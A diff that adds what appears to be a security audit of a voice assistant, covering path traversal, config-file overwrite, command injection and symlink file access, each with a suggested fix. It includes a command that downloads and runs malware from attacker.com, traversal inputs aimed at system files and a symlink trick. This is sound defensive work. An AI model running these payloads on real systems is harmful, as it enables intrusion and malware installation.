@@ -1,0 +1,71 @@
+* Path Traversal in Music Playback
+
+Description: Accessing files outside Music directory
+Vulnerable Code:
+
+python
+os.startfile(os.path.join(song_dir, song))  # No path validation
+Attack Scenario:
+
+User says: *"play ../../../Windows/System32/cmd.exe"*
+
+Code executes:
+
+python
+os.startfile("C:/Music/../../../Windows/System32/cmd.exe")  # Opens cmd.exe
+Expected Behavior:
+System should normalize and verify paths stay within allowed directory
+
+Proof of Concept:
+
+python
+# Path traversal test
+malicious_path = "../../../etc/passwd"
+try:
+    play_music(malicious_path)
+    assert False, "Vulnerable to path traversal"
+except SecurityError:
+    assert True  # Passed
+
+
+* Config File Overwrite
+
+Description: Modifying system files via assistant name change
+Vulnerable Code:
+
+python
+with open("assistant_name.txt", "w") as file:  # No path validation
+Attack Scenario:
+
+User says: "change your name to ../../Windows/system.ini"
+
+Code writes to:
+
+python
+open("../../Windows/system.ini", "w").write("malicious_content")
+Expected Behavior:
+Config files should only be written to a secure, app-specific directory
+
+Exploit Demonstration
+Command Injection Exploit Walkthrough
+Attacker identifies the voice assistant uses os.system()
+
+Crafts voice command containing ; or &&
+
+sh
+shutdown /s ; curl http://attacker.com/malware.exe -o malware.exe && malware.exe
+Microphone picks up the command
+
+System executes both shutdown and malware download
+
+Arbitrary File Access Exploit Walkthrough
+Attacker notices music files are played via os.startfile()
+
+Creates symbolic link:
+
+sh
+mklink C:\Music\fake.mp3 C:\Windows\System32\drivers\etc\hosts
+Says: "play fake.mp3"
+
+Assistant opens system hosts file instead of music
+
